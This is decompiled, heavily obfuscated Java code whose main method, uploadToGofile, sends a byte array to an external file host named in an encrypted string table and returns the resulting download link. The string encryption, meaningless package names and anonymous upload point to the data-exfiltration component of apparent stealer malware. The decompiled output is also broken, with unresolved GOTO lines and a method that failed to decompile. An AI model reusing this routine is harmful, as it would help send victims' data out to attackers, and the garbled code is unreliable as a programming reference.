/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.j;

import a.b.c.g.s5;
import a.b.c.j.o;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class e {
    private static final String m;
    private static final String[] e;
    private static final String[] E;
    private static final long K;
    private static final long a;

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Unable to fully structure code
     */
    public static String uploadToGofile(byte[] var0) {
        block84: {
            block85: {
                block82: {
                    block74: {
                        block79: {
                            block78: {
                                block76: {
                                    block72: {
                                        block73: {
                                            block71: {
                                                block99: {
                                                    block98: {
                                                        block69: {
                                                            block70: {
                                                                block68: {
                                                                    block96: {
                                                                        var1_1 = a.b.c.j.e.a ^ 85654015314971L;
                                                                        var5_2 = null;
                                                                        var6_3 = null;
                                                                        var4_4 = o.b();
                                                                        var3_5 = o.Z();
                                                                        var7_6 = System.getenv(a.b.c.j.e.h(11464, -5180));
                                                                        v0 = var7_6;
                                                                        if (var4_4) break block68;
                                                                        if (v0 == null) ** GOTO lbl35
                                                                        break block96;
                                                                        catch (IOException v1) {
                                                                            throw a.b.c.j.e.w(v1);
                                                                        }
                                                                    }
                                                                    try {
                                                                        v2 = var7_6;
                                                                        v3 = var4_4;
                                                                        if (var3_5 != null) {
                                                                            if (!v3) {
                                                                            }
                                                                            break block69;
                                                                        }
                                                                        ** GOTO lbl47
                                                                    }
                                                                    catch (IOException v4) {
                                                                        throw a.b.c.j.e.a(v4);
                                                                    }
                                                                    catch (IOException v5) {
                                                                        throw a.b.c.j.e.w(v5);
                                                                    }
                                                                    try {
                                                                        block97: {
                                                                            if (!v2.isEmpty()) break block70;
                                                                            break block97;
                                                                            catch (IOException v6) {
                                                                                throw a.b.c.j.e.w(v6);
                                                                            }
                                                                        }
                                                                        v0 = System.getenv(a.b.c.j.e.h(11456, -28072));
                                                                    }
                                                                    catch (IOException v7) {
                                                                        throw a.b.c.j.e.w(v7);
                                                                    }
                                                                }
                                                                var7_6 = v0;
                                                            }
                                                            v2 = var7_6;
                                                        }
                                                        v3 = var4_4;
lbl47:
                                                        // 2 sources

                                                        if (v3) break block71;
                                                        if (v2 == null) ** GOTO lbl66
                                                        break block98;
                                                        catch (IOException v8) {
                                                            throw a.b.c.j.e.w(v8);
                                                        }
                                                    }
                                                    v9 = var7_6;
                                                    if (var4_4) break block72;
                                                    break block99;
                                                    catch (IOException v10) {
                                                        throw a.b.c.j.e.w(v10);
                                                    }
                                                }
                                                try {
                                                    block100: {
                                                        if (!v9.isEmpty()) break block73;
                                                        break block100;
                                                        catch (IOException v11) {
                                                            throw a.b.c.j.e.w(v11);
                                                        }
                                                    }
                                                    v2 = a.b.c.j.e.h(11462, 4899);
                                                }
                                                catch (IOException v12) {
                                                    throw a.b.c.j.e.w(v12);
                                                }
                                            }
                                            var7_6 = v2;
                                        }
                                        v9 = var7_6 + a.b.c.j.e.h(11461, 10531);
                                    }
                                    var8_10 = v9;
                                    var9_11 = new URL(a.b.c.j.e.h(11467, -21128));
                                    var5_2 = (HttpURLConnection)var9_11.openConnection();
                                    var5_2.setRequestMethod(a.b.c.j.e.h(11459, -31079));
                                    var5_2.setDoOutput(true);
                                    var5_2.setRequestProperty(a.b.c.j.e.h(11458, -28805), a.b.c.j.e.h(11471, -23716));
                                    var10_12 = a.b.c.j.e.h(11460, 26247);
                                    var11_13 = a.b.c.j.e.h(11465, 695) + var10_12 + a.b.c.j.e.h(11470, -14468) + var8_10 + a.b.c.j.e.h(11463, -216);
                                    var12_14 = a.b.c.j.e.h(11469, -6644) + var10_12 + a.b.c.j.e.h(11468, 17188);
                                    var13_15 = var5_2.getOutputStream();
                                    var13_15.write(var11_13.getBytes(StandardCharsets.UTF_8));
                                    var13_15.write(var0);
                                    var13_15.write(var12_14.getBytes(StandardCharsets.UTF_8));
                                    var13_15.flush();
                                    var14_16 = var5_2.getResponseCode();
                                    try {
                                        if (var3_5 == null || var14_16 != (int)a.b.c.j.e.K) break block74;
                                    }
                                    catch (IOException v13) {
                                        throw a.b.c.j.e.a(v13);
                                    }
                                    var6_3 = var5_2.getInputStream();
                                    var15_17 = new byte[var6_3.available()];
                                    var6_3.read(var15_17);
                                    var16_18 = new String(var15_17, StandardCharsets.UTF_8);
                                    var17_19 = var16_18.split(a.b.c.j.e.h(11457, 8674))[1].split("\"")[0];
                                    try {
                                        block75: {
                                            try {
                                                try {
                                                    v14 = var6_3;
                                                    if (var4_4) break block75;
                                                    if (v14 == null) break block76;
                                                }
                                                catch (RuntimeException v15) {
                                                    throw a.b.c.j.e.a(v15);
                                                }
                                            }
                                            catch (IOException v16) {
                                                throw a.b.c.j.e.w(v16);
                                            }
                                            v14 = var6_3;
                                        }
                                        v14.close();
                                    }
                                    catch (IOException var18_20) {
                                        var18_20.printStackTrace();
                                    }
                                }
                                try {
                                    try {
                                        v17 = var5_2;
                                        if (var4_4) break block78;
                                        if (v17 == null) break block79;
                                    }
                                    catch (RuntimeException v18) {
                                        throw a.b.c.j.e.a(v18);
                                    }
                                }
                                catch (IOException v19) {
                                    throw a.b.c.j.e.w(v19);
                                }
                                v17 = var5_2;
                            }
                            v17.disconnect();
                        }
                        return var17_19;
                    }
                    try {
                        block81: {
                            try {
                                try {
                                    v20 = var6_3;
                                    if (var4_4) break block81;
                                    if (v20 == null) break block82;
                                }
                                catch (RuntimeException v21) {
                                    throw a.b.c.j.e.a(v21);
                                }
                            }
                            catch (IOException v22) {
                                throw a.b.c.j.e.w(v22);
                            }
                            v20 = var6_3;
                        }
                        v20.close();
                    }
                    catch (IOException var7_7) {
                        var7_7.printStackTrace();
                    }
                }
                try {
                    if (var3_5 == null) break block84;
                    try {
                        block101: {
                            v23 = var5_2;
                            if (var4_4) break block85;
                            break block101;
                            catch (IOException v24) {
                                throw a.b.c.j.e.a(v24);
                            }
                        }
                        if (v23 == null) break block84;
                    }
                    catch (IOException v25) {
                        throw a.b.c.j.e.a(v25);
                    }
                }
                catch (IOException v26) {
                    throw a.b.c.j.e.w(v26);
                }
                v23 = var5_2;
            }
            v23.disconnect();
            break block84;
            catch (IOException var7_8) {
                block88: {
                    block87: {
                        try {
                            var7_8.printStackTrace();
                        }
                        catch (Throwable var19_21) {
                            block94: {
                                block93: {
                                    block91: {
                                        try {
                                            block90: {
                                                try {
                                                    try {
                                                        v27 = var6_3;
                                                        if (var4_4) break block90;
                                                        if (v27 == null) break block91;
                                                    }
                                                    catch (RuntimeException v28) {
                                                        throw a.b.c.j.e.a(v28);
                                                    }
                                                }
                                                catch (IOException v29) {
                                                    throw a.b.c.j.e.w(v29);
                                                }
                                                v27 = var6_3;
                                            }
                                            v27.close();
                                        }
                                        catch (IOException var20_22) {
                                            var20_22.printStackTrace();
                                        }
                                    }
                                    try {
                                        try {
                                            v30 = var5_2;
                                            if (var4_4) break block93;
                                            if (v30 == null) break block94;
                                        }
                                        catch (RuntimeException v31) {
                                            throw a.b.c.j.e.a(v31);
                                        }
                                    }
                                    catch (IOException v32) {
                                        throw a.b.c.j.e.w(v32);
                                    }
                                    v30 = var5_2;
                                }
                                v30.disconnect();
                            }
                            throw var19_21;
                        }
                        try {
                            v33 = var6_3;
                            if (!var4_4) {
                                if (v33 == null) break block87;
                                v33 = var6_3;
                            }
                            v33.close();
                        }
                        catch (IOException var7_9) {
                            var7_9.printStackTrace();
                        }
                    }
                    try {
                        if (var3_5 == null) break block84;
                        try {
                            block102: {
                                v34 = var5_2;
                                if (var4_4) break block88;
                                break block102;
                                catch (IOException v35) {
                                    throw a.b.c.j.e.a(v35);
                                }
                            }
                            if (v34 == null) break block84;
                        }
                        catch (IOException v36) {
                            throw a.b.c.j.e.a(v36);
                        }
                    }
                    catch (IOException v37) {
                        throw a.b.c.j.e.w(v37);
                    }
                    v34 = var5_2;
                }
                v34.disconnect();
            }
        }
        return null;
    }

    private static IOException w(IOException iOException) {
        return iOException;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block27: {
            block25: {
                block26: {
                    block24: {
                        a.b.c.j.e.a = s5.a(-2472268951856205928L, 1694868148452038273L, MethodHandles.lookup().lookupClass()).a(151266225265048L);
                        var7 = new String[16];
                        var5_1 = 0;
                        var4_2 = "\u00c3\u0096\u009b\u0006G\u00fd\u0016\u00f6\u0013)\u00a0\u00c0\u00f4\u0083\u00a4\u0003\b!8\u00dc\u00be4\u0080~\u00f5\u0004\u0014pa\u00b7\f\u0093\u0097\u00ddO\u00a5\u00b5;\u00f1\u00fe%:O\u0004\u00e8\u00e2uR\b\u00f3\u008d\u00cf\u0016\u009e\u00c8{\u00e4$\u0087\u00abv\u00d12\u00b7\u0082\u00f9\u00f3h\u00bb{N\u00f33\re\u00f6 +$\u00bb1\u00b8\u0016\u00eb\u009fe\u0097B\u00bbF\u00e6tO\u0006\u0004\u00c5\u00e4\u00ce\u00fb\u0002\u00918\f`\u0013\u0080\u00dfy=\u00a7\u00e2`\u00ef\u008d\t#8/\u00fc$\u00ce\b\u00d9\u009a\u00b3\u0003\u008a\u00a9\u0019\u00e1\u0089\u0084_6\u00d8\u00c8\b\u001f\u0096\u008d\u00f2\u009e,V]}\u00a7\u00ef\u00ad\u00d7\u00a6#\u00d8O\u00e0(M\u0089\u00a9\u00aa\u00bd\u0005Ki!\u00f9\u008e\u0087\u00bfV\u00c4\u00c4\u008b\u009e\u00e6\u00bd\u00fc\u0098\u00ed\u0096ee\u00a0\u00ecM\u00b7\u00ba\u0004\u00c5\u00bc\u00d3\u00ba\u0004eP\u00c3\u00c3";
                        var6_3 = "\u00c3\u0096\u009b\u0006G\u00fd\u0016\u00f6\u0013)\u00a0\u00c0\u00f4\u0083\u00a4\u0003\b!8\u00dc\u00be4\u0080~\u00f5\u0004\u0014pa\u00b7\f\u0093\u0097\u00ddO\u00a5\u00b5;\u00f1\u00fe%:O\u0004\u00e8\u00e2uR\b\u00f3\u008d\u00cf\u0016\u009e\u00c8{\u00e4$\u0087\u00abv\u00d12\u00b7\u0082\u00f9\u00f3h\u00bb{N\u00f33\re\u00f6 +$\u00bb1\u00b8\u0016\u00eb\u009fe\u0097B\u00bbF\u00e6tO\u0006\u0004\u00c5\u00e4\u00ce\u00fb\u0002\u00918\f`\u0013\u0080\u00dfy=\u00a7\u00e2`\u00ef\u008d\t#8/\u00fc$\u00ce\b\u00d9\u009a\u00b3\u0003\u008a\u00a9\u0019\u00e1\u0089\u0084_6\u00d8\u00c8\b\u001f\u0096\u008d\u00f2\u009e,V]}\u00a7\u00ef\u00ad\u00d7\u00a6#\u00d8O\u00e0(M\u0089\u00a9\u00aa\u00bd\u0005Ki!\u00f9\u008e\u0087\u00bfV\u00c4\u00c4\u008b\u009e\u00e6\u00bd\u00fc\u0098\u00ed\u0096ee\u00a0\u00ecM\u00b7\u00ba\u0004\u00c5\u00bc\u00d3\u00ba\u0004eP\u00c3\u00c3".length();
                        var3_4 = 16;
                        var2_5 = -1;
lbl8:
                        // 2 sources

                        while (true) {
                            v0 = 64;
                            v1 = ++var2_5;
                            v2 = var4_2.substring(v1, v1 + var3_4);
                            v3 = -1;
                            break block24;
                            break;
                        }
lbl14:
                        // 1 sources

                        while (true) {
                            var7[var5_1++] = v4.intern();
                            if ((var2_5 += var3_4) < var6_3) {
                                var3_4 = var4_2.charAt(var2_5);
                                ** continue;
                            }
                            var4_2 = "O\u00b8\u00f9\u00a59\u00a0f\u0087\u0094_\u0013\u00c0$\u0093\n\u00b7\u0014w \u00b1\r\u0097\u008b\u0015\u0080\u0093L\u008c\"\u00f1\u00cc\u00d6L\u00a8RH\u00b1\u00819 >W\u00fe!\u00b7\u0086\u00fd\f\u008d\"\u00dee\u008bA\u001d\u007f\u00d7L\u00f1\u00c7\u0019\u001a\u0084\u0015\u00c6\u00d3\u00adA=\b\u0096N!\u009f\u00fe\\Kk\f\u000f\u00ea\u00b8\u001dhL\u00c5-\u0091\u00fcr\u00ac\u00fb\u00d5\u00c9#M";
                            var6_3 = "O\u00b8\u00f9\u00a59\u00a0f\u0087\u0094_\u0013\u00c0$\u0093\n\u00b7\u0014w \u00b1\r\u0097\u008b\u0015\u0080\u0093L\u008c\"\u00f1\u00cc\u00d6L\u00a8RH\u00b1\u00819 >W\u00fe!\u00b7\u0086\u00fd\f\u008d\"\u00dee\u008bA\u001d\u007f\u00d7L\u00f1\u00c7\u0019\u001a\u0084\u0015\u00c6\u00d3\u00adA=\b\u0096N!\u009f\u00fe\\Kk\f\u000f\u00ea\u00b8\u001dhL\u00c5-\u0091\u00fcr\u00ac\u00fb\u00d5\u00c9#M".length();
                            var3_4 = 38;
                            var2_5 = -1;
lbl23:
                            // 2 sources

                            while (true) {
                                v0 = 57;
                                v5 = ++var2_5;
                                v2 = var4_2.substring(v5, v5 + var3_4);
                                v3 = 0;
                                break block24;
                                break;
                            }
                            break;
                        }
lbl29:
                        // 1 sources

                        while (true) {
                            var7[var5_1++] = v4.intern();
                            if ((var2_5 += var3_4) < var6_3) {
                                var3_4 = var4_2.charAt(var2_5);
                                ** continue;
                            }
                            break block25;
                            break;
                        }
                    }
                    v6 = v2.toCharArray();
                    v7 = v6.length;
                    var8_6 = 0;
                    try {
                        v8 = v0;
                        v9 = v6;
                        v10 = v7;
                        if (v7 > 1) break block26;
lbl47:
                        // 2 sources

                        while (true) {
                            v11 = v8;
                            v9 = v9;
                            v12 = v9;
                            v13 = v8;
                            v14 = var8_6;
                            break;
                        }
                    }
                    catch (RuntimeException v15) {
                        throw a.b.c.j.e.a(v15);
                    }
                    while (true) {
                        switch (var8_6 % 7) {
                            case 0: {
                                v16 = 37;
                                break;
                            }
                            case 1: {
                                v16 = 113;
                                break;
                            }
                            case 2: {
                                v16 = 6;
                                break;
                            }
                            case 3: {
                                v16 = 45;
                                break;
                            }
                            case 4: {
                                v16 = 80;
                                break;
                            }
                            case 5: {
                                v16 = 37;
                                break;
                            }
                            default: {
                                v16 = 112;
                            }
                        }
                        try {
                            v12[v14] = (char)(v12[v14] ^ (v13 ^ v16));
                            ++var8_6;
                            v8 = v11;
                            if (v11 != 0) break;
                            v11 = v8;
                            v9 = v9;
                            v14 = v8;
                            v12 = v9;
                            v13 = v8;
                        }
                        catch (RuntimeException v17) {
                            throw a.b.c.j.e.a(v17);
                        }
                    }
                }
                v18 = v9;
                v10 = v10;
                ** while (v10 > var8_6)
lbl98:
                // 1 sources

                v4 = new String(v18);
                switch (v3) {
                    default: {
                        ** continue;
                    }
                    ** case 0:
lbl105:
                    // 1 sources

                    ** continue;
                }
            }
            a.b.c.j.e.e = var7;
            a.b.c.j.e.E = new String[16];
            a.b.c.j.e.m = a.b.c.j.e.h(11466, 3544);
            break block27;
lbl111:
            // 1 sources

            while (true) {
                continue;
                break;
            }
        }
        var0_7 = 4424848862274523420L;
        ** while (true)
        a.b.c.j.e.K = -8536264261160529452L ^ var0_7;
    }

    /*
     * Exception decompiling
     */
    private static String h(int var0, int var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 4[SWITCH]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    private static Exception a(Exception exception) {
        return exception;
    }
}

